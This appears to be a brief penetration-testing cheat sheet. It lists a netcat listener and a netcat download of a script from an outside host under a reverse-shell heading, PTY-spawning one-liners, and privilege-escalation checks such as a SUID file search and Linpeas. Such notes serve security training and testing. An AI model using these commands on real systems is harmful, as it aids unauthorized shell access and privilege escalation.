
# Reverse shells in Bash

  - `nc -nvlp 9999`
  - Download files: `nc -q 0 $HIP $HPORT > /dev/shm/script.sh`

# How to spawn PTYs

  - Using `script`: `/usr/bin/script -qc /bin/bash /dev/null`
  - `python -c 'import pty; pty.spawn("/bin/bash")'`

# Check privileges

  - `sudo -l`
  - Linpeas
  - `find / -user root -perm -4000 -print 2>/dev/null` 

